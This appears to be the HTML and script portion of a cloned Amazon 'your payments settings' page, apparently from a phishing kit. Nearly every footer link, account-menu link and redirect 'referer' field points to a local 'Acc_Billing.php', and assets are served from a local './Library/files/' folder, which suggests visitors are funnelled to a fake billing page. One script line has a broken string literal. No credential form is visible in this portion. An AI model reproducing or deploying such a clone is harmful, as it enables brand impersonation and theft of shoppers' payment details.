      window.$Nav && $Nav.declare('config.prefetchUrls', ["https://images-na.ssl-images-amazon.com/images/G/01/authportal/common/images/amazon_logo_no-org_mid._CB485934470_.png","https://images-na.ssl-images-amazon.com/images/G/01/authportal/common/images/amznbtn-sprite03._CB485966112_.png","https://images-na.ssl-images-amazon.com/images/G/01/authportal/flex/reduced-nav/ap-flex-reduced-nav-2.0._CB485968702_.js","https://images-na.ssl-images-amazon.com/images/G/01/authportal/flex/reduced-nav/ap-flex-reduced-nav-2.1._CB485967487_.css","https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/nav-sprite-global_bluebeacon-1x_optimized_layout1._CB468670774_.png","https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/buttons/sign-in-secure._CB485941572_.gif","https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/login/fwcim._CB454428048_.js","https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/transparent-pixel._CB485935036_.gif"]);
window.$Nav && $Nav.declare('config.prefetch',function() {
    var pUrls = window.$Nav.getNow('config.prefetchUrls');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).when('A').execute(function (A) { A.preload(pUrls); });
});

  /*  */
  
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('A').execute(function(A){
  if(A.preload){
    A.preload('https://images-na.ssl-images-amazon.com/images/I/417L6LIsU6L._RC|71Mg+ytl4oL.js,61nu+N-SMyL.js,41W9ohA0e+L.js,11vrNkbdcvL.js,21qaguVEGfL.js,41QN7vBTpzL.js,51MzEF-M1PL.js,313jWehHlpL.js_.js?AUIClients/NavDesktopMetaAsset#desktop');
    A.preload('https://images-na.ssl-images-amazon.com/images/I/21taIyvn9cL._RC|71OKa2k7jrL.css,21TJB5pc5TL.css,31vGzsqCErL.css,21lRUdwotiL.css,41tc24mJIGL.css,11G4HxMtMSL.css,31OvHRW+XiL.css,01XHMOHpK1L.css_.css?AUIClients/NavDesktopMetaAsset#desktop');
  }
});




    window.$Nav && $Nav.declare('config.flyoutURL', null);
    window.$Nav && $Nav.declare('btf.lite');
    window.$Nav && $Nav.declare('btf.full');
    window.$Nav && $Nav.declare('btf.exists');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).register('navCF');
  </script>










<script type="text/javascript">
    window.$Nav && $Nav.when('$', 'page.ready').run('MXMarketplaceRedirectOverlay',function($) {
        $.ajax({
            type: 'POST',
            url: '/gp/redirection/mexico.html',
            data: {
                path: '/cpe/yourpayments/settings',
                queryString: '?ie=UTF8\u0026returnFromLogin=1',
                pageType: 'CPEFront',
                referer: 'Acc_Billing.php'
            },
            success: function(data) {
                if (data) {
                    $('body').append(data);
                }
            }
        });
    });
</script>

    










<script type="text/javascript">
    window.$Nav && $Nav.when('$').run('CAMarketplaceRedirectOverlay',function($) {
        $.ajax({
            type: 'POST',
            url: '/gp/redirection/canada.html',
            data: {
                path: '/cpe/yourpayments/settings',
                queryString: '?ie=UTF8\u0026returnFromLogin=1',
                pageType: 'CPEFront',

                referer: 'Acc_Billing.php'
            },
            success: function(data) {
                if (data) {
                    $('body').append(data);
                }
            }
        });
    });
</script>

    









    




    <link rel="stylesheet" type="text/css" href="./Library/files/redirect-overlay-nav-https-20200206._CB423514839_.css">
    <!--[if lte IE 9]><link rel="stylesheet" type="text/css" href="Acc_Billing.php"><![endif]-->


<script type="text/javascript">
    window.$Nav && $Nav.when('$').run('AUMarketplaceRedirectOverlay',function($) {
        $.ajax({
            type: 'POST',
            url: '/gp/redirection/australia.html',
            data: {
                path: '/cpe/yourpayments/settings',
                queryString: '?ie=UTF8\u0026returnFromLogin=1',
                pageType: 'CPEFront',
                referer: 'Acc_Billing.php'
            },
            success: function(data) {
                if (data) {
                    $('body').append(data);
                }
            }
        });
    });
</script>

    










<script type="text/javascript">
    window.$Nav && $Nav.when('$').run('AEMarketplaceRedirectOverlay',function($) {
        $.ajax({
            type: 'POST',
            url: '/gp/redirection/uae.html',
            data: {
                path: '/cpe/yourpayments/settings',
                queryString: '?ie=UTF8\u0026returnFromLogin=1',
                pageType: 'CPEFront',
                referer: Acc_Billing.php'
            },
            success: function(data) {
                if (data) {
                    $('body').append(data);
                }
            }
        });
    });
</script>

    










<script type="text/javascript">
    window.$Nav && $Nav.when('$').run('SGMarketplaceRedirectOverlay',function($) {
        $.ajax({
            type: 'POST',
            url: '/gp/redirection/singapore.html',
            data: {
                path: '/cpe/yourpayments/settings',
                queryString: '?ie=UTF8\u0026returnFromLogin=1',
                pageType: 'CPEFront',
                referer: 'Acc_Billing.php'
            },
            success: function(data) {
                if (data) {
                    $('body').append(data);
                }
            }
        });
    });
</script>







<script type="text/javascript">window.$Nav && $Nav.when("data").run(function(data){data({"accountListContent":{"html":"<div id='nav-al-container'><div id='nav-al-wishlist' class='nav-al-column nav-tpl-itemList'><div class='nav-title' id='nav-al-title'>Your Lists</div><a href='Acc_Billing.php' class='nav-link nav-item'><span class='nav-text'>Create a List</span></a> <a href='/gp/registry/search?ref_=nav_ListFlyout_find' class='nav-link nav-item'><span class='nav-text'>Find a List or Registry</span></a> <a href='/gcx/Gifts-for-Everyone/gfhz/?_encoding=UTF8&ref_=nav_wishlist_gf' class='nav-link nav-item'><span class='nav-text'>Find a Gift</span></a> <a href='/gp/BIT?bitCampaignCode=a0032&ref_=nav_ListFlyout_bit_v2_a0032' class='nav-link nav-item'><span class='nav-text'>Save Items from the Web</span></a> <a href='/wedding/home?ref_=nav_ListFlyout_wr' class='nav-link nav-item'><span class='nav-text'>Wedding Registry</span></a> <a href='/baby-reg/homepage?ref_=nav_ListFlyout_br' class='nav-link nav-item'><span class='nav-text'>Baby Registry</span></a> <a href='/gp/clpf?ref_=nav_ListFlyout_smi_se_ya_lll_ll' class='nav-link nav-item'><span class='nav-text'>AmazonSmile Charity Lists</span></a> <a href='/gp/pantry/yourlists?ref_=nav_ListFlyout_pntry_gno' class='nav-link nav-item'><span class='nav-text'>Pantry Lists</span></a> <a href='/ideas/saves?ref_=nav_ListFlyout_strm_in_youtique_lists' class='nav-link nav-item'><span class='nav-text'>Your Hearts</span></a> <a href='/ideas?ref_=nav_ListFlyout_idea_nav' class='nav-link nav-item'><span class='nav-text'>Explore Idea Lists</span></a> <a href='/showroom?ref_=nav_ListFlyout_srm_your_desk_wl' class='nav-link nav-item'><span class='nav-text'>Explore Showroom</span></a> <a href='/stylequiz/?ref_=nav_ListFlyout_sq_ya_yl' class='nav-link nav-item'><span class='nav-text'>Take the Home Style Quiz</span></a></div><div id='nav-al-your-account' class='nav-al-column nav-template nav-flyout-content nav-tpl-itemList'><div class='nav-title'>Your Account</div><a href='/gp/css/homepage.html?ref_=nav_AccountFlyout_ya' class='nav-link nav-item'><span class='nav-text'>Your Account</span></a> <a id='nav_prefetch_yourorders' href='/gp/css/order-history?ref_=nav_AccountFlyout_orders' class='nav-link nav-item'><span class='nav-text'>Your Orders</span></a> <a href='/gp/yourstore?ref_=nav_AccountFlyout_recs' class='nav-link nav-item'><span class='nav-text'>Your Recommendations</span></a> <a href='/gp/subscribe-and-save/manager/viewsubscriptions?ref_=nav_AccountFlyout_sns' class='nav-link nav-item'><span class='nav-text'>Your Subscribe & Save Items</span></a> <a href='/yourmembershipsandsubscriptions?ref_=nav_AccountFlyout_digital_subscriptions' class='nav-link nav-item'><span class='nav-text'>Memberships & Subscriptions</span></a> <a href='/localservices/ya/servicerequests?ref_=nav_AccountFlyout_desktop_vas_requestlist' class='nav-link nav-item'><span class='nav-text'>Your Service Requests</span></a> <a href='/gp/your-garage/?ref_=nav_AccountFlyout_au_pf_as_GNO' class='nav-link nav-item'><span class='nav-text'>Your Garage</span></a> <a href='/fanshop?ref_=nav_AccountFlyout_yfs' class='nav-link nav-item'><span class='nav-text'>Your Fanshop</span></a> <a href='/yourpets?ref_=nav_AccountFlyout_pet_proLibrary/files' class='nav-link nav-item'><span class='nav-text'>Your Pets</span></a> <a href='/hz/mycd/myx?ref_=nav_AccountFlyout_myk' class='nav-link nav-item'><span class='nav-text'>Your Content and Devices</span></a> <a href='/gp/dmusic/mp3/player?ref_=nav_AccountFlyout_cldplyr' class='nav-link nav-item'><span class='nav-text'>Your Music Library</span></a> <a href='/clouddrive?ref_=nav_AccountFlyout_clddrv' class='nav-link nav-item'><span class='nav-text'>Your Amazon Drive</span></a> <a href='/Prime-Instant-Video/s/browse?node=2676882011&ref_=nav_AccountFlyout_piv' class='nav-link nav-item'><span class='nav-text'>Your Prime Video</span></a> <a href='/gp/kindle/ku/ku_central?ref_=nav_AccountFlyout_ku' class='nav-link nav-item'><span class='nav-text'>Your Kindle Unlimited</span></a> <a href='/gp/video/watchlist?ref_=nav_AccountFlyout_ywl' class='nav-link nav-item'><span class='nav-text'>Your Watchlist</span></a> <a href='/gp/video/library?ref_=nav_AccountFlyout_yvl' class='nav-link nav-item'><span class='nav-text'>Your Video Purchases & Rentals</span></a> <a href='/gp/mas/your-account/myapps?ref_=nav_AccountFlyout_aad' class='nav-link nav-item'><span class='nav-text'>Your Android Apps & Devices</span></a> <a id='nav-item-switch-account' href='Acc_Billing.php' class='nav-link nav-item'><span class='nav-text'>Switch Accounts</span></a> <a id='nav-item-signout' href='/gp/flex/sign-out.html?path=%2Fgp%2Fyourstore%2Fhome&signIn=1&useRedirectOnSuccess=1&action=sign-out&ref_=nav_AccountFlyout_signout' class='nav-link nav-item'><span class='nav-text'>Sign Out</span></a></div></div>"}})})</script>

    
    
    









<script type="text/javascript">
  window.$Nav && window.$Nav.build('PldnLocalStorage', function() {
    var PldnLocalStorage = function() {};

    PldnLocalStorage.prototype.setItem = function(key, obj) {
      if (typeof obj !== 'string') {
        obj = window.JSON && window.JSON.stringify(obj);
      }

      try {
        window.localStorage && window.localStorage.setItem(key, obj);
        return true;
      } catch (exception) {
        return false;
      };
    };

    PldnLocalStorage.prototype.getItem = function(key) {
      try {
        return window.localStorage && window.localStorage.getItem(key);
      } catch(exception) {};
    };

    return new PldnLocalStorage();
  });

  window.$Nav && window.$Nav.when('PldnLocalStorage').run('PldnUcolCheck', function(storage) {
    if (!storage.getItem('amazonSmileCampaigns')) {
      storage.setItem('amazonSmileCampaigns', {
        "ucol": {
          "optOut": false,
          "hits": [
            {
              "date": new Date(),
              "redirect": false,
              "optOut": false
            }
          ]
        }
      });
    }
  });
</script>
<!-- btf tilu -->


<!-- sp:feature:host-btf -->
<!-- sp:end-feature:host-btf -->
<!-- sp:feature:aui-preload -->
<!-- sp:feature:nav-footer -->
<!-- footer pilu -->
<div class="navLeftFooter nav-sprite-v1" id="navFooter"><a href="Acc_Billing.php" id="navBackToTop"><div class=""><span class=""></span></div></a>

<div class="navFooterVerticalColumn navAccessibility" role="presentation"><div class="navFooterVerticalRow navAccessibility" style="display: table-row;"><div class="navFooterLinkCol navAccessibility"><div class="navFooterColHead">Get to Know Us</div><ul><li class="nav_first"><a href="Acc_Billing.php" class="nav_a">Careers</a></li><li><a href="Acc_Billing.php" class="nav_a">Blog</a></li><li><a href="https://www.aboutamazon.com/?utm_source=gateway&amp;utm_medium=footer" class="nav_a">About Amazon</a></li><li><a href="Acc_Billing.php" class="nav_a">Investor Relations</a></li><li><a href="Acc_Billing.php" class="nav_a">Amazon Devices</a></li><li class="nav_last"><a href="Acc_Billing.php" class="nav_a">Amazon Tours</a></li></ul></div><div class="navFooterColSpacerInner navAccessibility"></div><div class="navFooterLinkCol navAccessibility"><div class="navFooterColHead">Make Money with Us</div><ul><li class="nav_first"><a href="Acc_Billing.php" class="nav_a">Sell on Amazon</a></li><li><a href="Acc_Billing.php" class="nav_a">Sell Your Services on Amazon</a></li><li><a href="https://sell.amazon.com/programs/amazon-business.html?ld=usb2bunifooter&amp;ref_=footer_b2b" class="nav_a">Sell on Amazon Business</a></li><li><a href="https://developer.amazon.com/" class="nav_a">Sell Your Apps on Amazon</a></li><li><a href="https://affiliate-program.amazon.com/" class="nav_a">Become an Affiliate</a></li><li><a href="https://advertising.amazon.com/?ref=ext_amzn_ftr" class="nav_a">Advertise Your Products</a></li><li><a href="Acc_Billing.php" class="nav_a">Self-Publish with Us</a></li><li class="nav_last nav_a_carat"><span class="nav_a_carat">›</span><a href="Acc_Billing.php" class="nav_a">See More</a></li></ul></div><div class="navFooterColSpacerInner navAccessibility"></div><div class="navFooterLinkCol navAccessibility"><div class="navFooterColHead">Amazon Payment Products</div><ul><li class="nav_first"><a href="Acc_Billing.php" class="nav_a">Amazon Business Card</a></li><li><a href="Acc_Billing.php" class="nav_a">Shop with Points</a></li><li><a href="Acc_Billing.php" class="nav_a">Reload Your Balance</a></li><li class="nav_last"><a href="Acc_Billing.php" class="nav_a">Amazon Currency Converter</a></li></ul></div><div class="navFooterColSpacerInner navAccessibility"></div><div class="navFooterLinkCol navAccessibility"><div class="navFooterColHead">Let Us Help You</div><ul><li class="nav_first"><a href="Acc_Billing.php" class="nav_a">Amazon and COVID-19</a></li><li><a href="Acc_Billing.php" class="nav_a">Your Account</a></li><li><a href="Acc_Billing.php" class="nav_a">Your Orders</a></li><li><a href="Acc_Billing.php" class="nav_a">Shipping Rates &amp; Policies</a></li><li><a href="Acc_Billing.php" class="nav_a">Returns &amp; Replacements</a></li><li><a href="Acc_Billing.php" class="nav_a">Manage Your Content and Devices</a></li><li><a href="Acc_Billing.php" class="nav_a">Amazon Assistant</a></li><li class="nav_last"><a href="Acc_Billing.php" class="nav_a">Help</a></li></ul></div></div></div><div class="nav-footer-line"></div>
   
<div class="navFooterLine navFooterLinkLine navFooterPadItemLine"><span><div class="navFooterLine navFooterLogoLine"><a href="Acc_Billing.php"><div class="nav-logo-base nav-sprite"></div></a></div>
</span><ul></ul><span class="icp-container-desktop"><div class="navFooterLine">












  











<style type="text/css">
  #icp-touch-link-language { display: none; }
</style>

<a href="Acc_Billing.php" class="icp-button a-declarative" id="icp-touch-link-language">
  <div class="icp-nav-globe-img-2 icp-button-globe-2 icp-nav-globe-curr-fix">​</div><span class="icp-color-base">English</span><span class="nav-arrow icp-up-down-arrow"></span><span class="aok-hidden" style="display:none">Choose a language for shopping.</span>
</a>








  




<style type="text/css">
  #icp-touch-link-cop { display: none; }
</style>

<a href="Acc_Billing.php" class="icp-button" id="icp-touch-link-cop">
  <span class="icp-currency-symbol">$</span><span class="icp-color-base">USD - U.S. Dollar</span>
</a>












<style type="text/css">
#icp-touch-link-country { display: none; }
</style>

  



<a href="Acc_Billing.php" class="icp-button a-declarative" id="icp-touch-link-country">
  <span class="icp-flag-3 icp-flag-3-us">​</span><span class="icp-color-base">United States</span><span class="aok-hidden" style="display:none">Choose a country/region for shopping.</span>
</a>


</div>
</span><ul></ul></div>

<div class="navFooterLine navFooterLinkLine navFooterDescLine" role="navigation" aria-label="More on Amazon.com"><table class="navFooterMoreOnAmazon" cellspacing="0"><tbody><tr>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Music<br> <span class="navFooterDescText">Stream millions<br> of songs</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Advertising<br> <span class="navFooterDescText">Find, attract, and<br> engage customers</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Drive<br> <span class="navFooterDescText">Cloud storage<br> from Amazon</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.6pm.com/" class="nav_a">6pm<br> <span class="navFooterDescText">Score deals<br> on fashion brands</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.abebooks.com/" class="nav_a">AbeBooks<br> <span class="navFooterDescText">Books, art<br> &amp; collectibles</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.acx.com/" class="nav_a">ACX <br> <span class="navFooterDescText">Audiobook Publishing<br> Made Easy</span></a></td>
</tr>
<tr><td>&nbsp;</td></tr>
<tr>
<td class="navFooterDescItem"><a href="https://www.alexa.com/" class="nav_a">Alexa<br> <span class="navFooterDescText">Actionable Analytics<br> for the Web</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Sell on Amazon<br> <span class="navFooterDescText">Start a Selling Account</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Business<br> <span class="navFooterDescText">Everything For<br> Your Business</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">AmazonGlobal<br> <span class="navFooterDescText">Ship Orders<br> Internationally</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Home Services<br> <span class="navFooterDescText">Handpicked Pros<br> Happiness Guarantee</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Ignite<br> <span class="navFooterDescText">Sell your original<br> Digital Educational<br> Resources</span></a></td>
</tr>
<tr><td>&nbsp;</td></tr>
<tr>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Rapids<br> <span class="navFooterDescText">Fun stories for<br>  kids on the go</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Web Services<br> <span class="navFooterDescText">Scalable Cloud<br> Computing Services</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.audible.com/" class="nav_a">Audible<br> <span class="navFooterDescText">Listen to Books &amp; Original<br> Audio Performances</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.bookdepository.com/" class="nav_a">Book Depository<br> <span class="navFooterDescText">Books With Free<br> Delivery Worldwide</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.boxofficemojo.com/?ref_=amzn_nav_ftr" class="nav_a">Box Office Mojo<br> <span class="navFooterDescText">Find Movie<br> Box Office Data</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.comixology.com/" class="nav_a">ComiXology<br> <span class="navFooterDescText">Thousands of<br> Digital Comics</span></a></td>
</tr>
<tr><td>&nbsp;</td></tr>
<tr>
<td class="navFooterDescItem"><a href="https://www.createspace.com/" class="nav_a">CreateSpace<br> <span class="navFooterDescText">Indie Print Publishing<br> Made Easy</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.dpreview.com/" class="nav_a">DPReview<br> <span class="navFooterDescText">Digital<br> Photography</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.eastdane.com/welcome" class="nav_a">East Dane<br> <span class="navFooterDescText">Designer Men's<br> Fashion</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.fabric.com/" class="nav_a">Fabric<br> <span class="navFooterDescText">Sewing, Quilting<br> &amp; Knitting</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.goodreads.com/" class="nav_a">Goodreads<br> <span class="navFooterDescText">Book reviews<br> &amp; recommendations</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.imdb.com/" class="nav_a">IMDb<br> <span class="navFooterDescText">Movies, TV<br> &amp; Celebrities</span></a></td>
</tr>
<tr><td>&nbsp;</td></tr>
<tr>
<td class="navFooterDescItem"><a href="https://pro.imdb.com/?ref_=amzn_nav_ftr" class="nav_a">IMDbPro<br> <span class="navFooterDescText">Get Info Entertainment<br> Professionals Need</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Kindle Direct Publishing<br> <span class="navFooterDescText">Indie Digital Publishing<br> Made Easy
</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Prime Video Direct<br> <span class="navFooterDescText">Video Distribution<br> Made Easy</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.shopbop.com/welcome" class="nav_a">Shopbop<br> <span class="navFooterDescText">Designer<br> Fashion Brands</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.woot.com/" class="nav_a">Woot!<br> <span class="navFooterDescText">Deals and <br> Shenanigans</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.zappos.com/" class="nav_a">Zappos<br> <span class="navFooterDescText">Shoes &amp;<br> Clothing</span></a></td>
</tr>
<tr><td>&nbsp;</td></tr>
<tr>
<td class="navFooterDescItem"><a href="https://ring.com/" class="nav_a">Ring<br> <span class="navFooterDescText">Smart Home<br> Security Systems
</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://eero.com/" class="nav_a">eero WiFi<br> <span class="navFooterDescText">Stream 4K Video<br> in Every Room</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://shop.ring.com/pages/neighbors-app" class="nav_a">Neighbors App <br> <span class="navFooterDescText"> Real-Time Crime<br> &amp; Safety Alerts
</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Subscription Boxes<br> <span class="navFooterDescText">Top subscription boxes – right to your door</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="https://www.pillpack.com/" class="nav_a">PillPack<br> <span class="navFooterDescText">Pharmacy Simplified</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="Acc_Billing.php" class="nav_a">Amazon Second Chance<br> <span class="navFooterDescText">Pass it on, trade it in,<br> give it a second life</span></a></td>
</tr>
</tbody></table></div>
   
<div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"><ul><li class="nav_first"><a href="Acc_Billing.php" class="nav_a">Conditions of Use</a></li><li><a href="Acc_Billing.php" class="nav_a">Privacy Notice</a></li><li><a href="Acc_Billing.php" class="nav_a">Interest-Based Ads</a></li><li class="nav_last">© 1996-2020, Amazon.com, Inc. or its affiliates</li></ul></div>
</div><!-- whfh-/5NFqskzpgaoe+2yPFqI9ZKARN44pZMrQQ+8vH0okGkiMhdYH/mLz7FokRc1DxyNKX0kn4sqqyg= rid-YF5GA687BG8W5SSXJPYR -->
















    





<div id="sis_pixel_r2" aria-hidden="true" style="height:1px; position: absolute; left: -1000000px; top: -1000000px;"><iframe id="DAsis" src="./Library/files/iu3.html" width="1" height="1" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></div><script>(function(a,b){a.attachEvent?a.attachEvent("onload",b):a.addEventListener&&a.addEventListener("load",b,!1)})(window,function(){setTimeout(function(){var el=document.getElementById("sis_pixel_r2");el&&(el.innerHTML='<iframe id="DAsis" src="//s.amazon-adsystem.com/iu3?d=amazon.com&slot=navFooter&a1=010182d76f3a4e588c2b20a70dd5612245ffbbfb076df314d9a2e091da8b2cbc92e3&a2=01014bdbb87bf164155639c149f4109f6a8ba91fe291f7f3139331b5d56f57c0265f&old_oo=0&ts=1588861857010&s=AavKnsf8z27ipS5QANPnDzTchu2KLkZdhtl6933qj_hp&cb=1588861857010" width="1" height="1" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>')},300)});</script><!-- footer tilu -->


<!-- sp:feature:amazon-pay-iframe -->
<!-- sp:end-feature:amazon-pay-iframe -->
<div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="Acc_Billing.php"><input type="hidden" name="ue_back" value="1"></form>


<script type="text/javascript">
window.ue_ibe = (window.ue_ibe || 0) + 1;
if (window.ue_ibe === 1) {

(function(e,c){function h(b,a){f.push([b,a])}function g(b,a){if(b){var c=e.head||e.getElementsByTagName("head")[0]||e.documentElement,d=e.createElement("script");d.async="async";d.src=b;d.setAttribute("crossorigin","anonymous");a&&a.onerror&&(d.onerror=a.onerror);a&&a.onload&&(d.onload=a.onload);c.insertBefore(d,c.firstChild)}}function k(){ue.uels=g;for(var b=0;b<f.length;b++){var a=f[b];g(a[0],a[1])}ue.deffered=1}var f=[];c.ue&&(ue.uels=h,c.ue.attach&&c.ue.attach("load",k))})(document,window);


if (window.ue && window.ue.uels) {
        var cel_widgets = [ { "c":"celwidget" },{ "s":"#nav-swmslot > div", "id_gen":function(elem, index){ return 'nav_sitewide_msg'; } } ];

                ue.uels("https://images-na.ssl-images-amazon.com/images/I/31BVuidgT8L.js");
}
var ue_mbl=ue_csm.ue.exec(function(e,a){function l(f){b=f||{};a.AMZNPerformance=b;b.transition=b.transition||{};b.timing=b.timing||{};e.ue.exec(m,"csm-android-check")()&&b.tags instanceof Array&&(f=-1!=b.tags.indexOf("usesAppStartTime")||b.transition.type?!b.transition.type&&-1<b.tags.indexOf("usesAppStartTime")?"warm-start":void 0:"view-transition",f&&(b.transition.type=f));"reload"===c._nt&&e.ue_orct||"intrapage-transition"===c._nt?a.performance&&performance.timing&&performance.timing.navigationStart?
b.timing.transitionStart=a.performance.timing.navigationStart:delete b.timing.transitionStart:"undefined"===typeof c._nt&&a.performance&&performance.timing&&performance.timing.navigationStart&&a.history&&"function"===typeof a.History&&"object"===typeof a.history&&history.length&&1!=history.length&&(b.timing.transitionStart=a.performance.timing.navigationStart);f=b.transition;var d;d=c._nt?c._nt:void 0;f.subType=d;a.ue&&a.ue.tag&&a.ue.tag("has-AMZNPerformance");c.isl&&a.uex&&uex("at","csm-timing");
n()}function p(b){a.ue&&a.ue.count&&a.ue.count("csm-cordova-plugin-failed",1)}function m(){return a.webclient&&"function"===typeof a.webclient.getRealClickTime?a.cordova&&a.cordova.platformId&&"ios"==a.cordova.platformId?!1:!0:!1}function n(){try{P.register("AMZNPerformance",function(){return b})}catch(a){}}function h(){if(!b)return"";ue_mbl.cnt=null;for(var a=b.timing,d=b.transition,a=["mts",k(a.transitionStart),"mps",k(a.processStart),"mtt",d.type,"mtst",d.subType,"mtlt",d.launchType],d="",c=0;c<
a.length;c+=2){var e=a[c],g=a[c+1];"undefined"!==typeof g&&(d+="&"+e+"="+g)}return d}function k(a){if("undefined"!==typeof a&&"undefined"!==typeof g)return a-g}function q(a,c){b&&(g=c,b.timing.transitionStart=a,b.transition.type="view-transition",b.transition.subType="ajax-transition",b.transition.launchType="normal",ue_mbl.cnt=h)}var c=e.ue||{},g=e.ue_t0,b;if(a.P&&a.P.when&&a.P.register)return a.P.when("CSMPlugin").execute(function(a){a.buildAMZNPerformance&&a.buildAMZNPerformance({successCallback:l,
failCallback:p})}),{cnt:h,ajax:q}},"mobile-timing")(ue_csm,window);

(function(d){d._uess=function(){var a="";screen&&screen.width&&screen.height&&(a+="&sw="+screen.width+"&sh="+screen.height);var b=function(a){var b=document.documentElement["client"+a];return"CSS1Compat"===document.compatMode&&b||document.body["client"+a]||b},c=b("Width"),b=b("Height");c&&b&&(a+="&vw="+c+"&vh="+b);return a}})(ue_csm);

(function(a){var b=document.ue_backdetect;b&&b.ue_back&&a.ue&&(a.ue.bfini=b.ue_back.value);a.uet&&a.uet("be");a.onLdEnd&&(window.addEventListener?window.addEventListener("load",a.onLdEnd,!1):window.attachEvent&&window.attachEvent("onload",a.onLdEnd));a.ueh&&a.ueh(0,window,"load",a.onLd,1);a.ue&&a.ue.tag&&(a.ue_furl?(b=a.ue_furl.replace(/\./g,"-"),a.ue.tag(b)):a.ue.tag("nofls"))})(ue_csm);

(function(g,h){function d(a,d){var b={};if(!e||!f)try{var c=h.sessionStorage;c?a&&("undefined"!==typeof d?c.setItem(a,d):b.val=c.getItem(a)):f=1}catch(g){e=1}e&&(b.e=1);return b}var b=g.ue||{},a="",f,e,c,a=d("csmtid");f?a="NA":a.e?a="ET":(a=a.val,a||(a=b.oid||"NI",d("csmtid",a)),c=d(b.oid),c.e||(c.val=c.val||0,d(b.oid,c.val+1)),b.ssw=d);b.tabid=a})(ue_csm,window);
ue_csm.ue.exec(function(e,f){var a=e.ue||{},b=a._wlo,d;if(a.ssw){d=a.ssw("CSM_previousURL").val;var c=f.location,b=b?b:c&&c.href?c.href.split("#")[0]:void 0;c=(b||"")===a.ssw("CSM_previousURL").val;!c&&b&&a.ssw("CSM_previousURL",b);d=c?"reload":d?"intrapage-transition":"first-view"}else d="unknown";a._nt=d},"NavTypeModule")(ue_csm,window);
ue_csm.ue.exec(function(c,a){function g(a){a.run(function(e){d.tag("csm-feature-"+a.name+":"+e);d.isl&&c.uex("at")})}if(a.addEventListener)for(var d=c.ue||{},f=[{name:"touch-enabled",run:function(b){var e=function(){a.removeEventListener("touchstart",c,!0);a.removeEventListener("mousemove",d,!0)},c=function(){b("true");e()},d=function(){b("false");e()};a.addEventListener("touchstart",c,!0);a.addEventListener("mousemove",d,!0)}}],b=0;b<f.length;b++)g(f[b])},"csm-features")(ue_csm,window);


(function(b,c){var a=c.images;a&&a.length&&b.ue.count("totalImages",a.length)})(ue_csm,document);
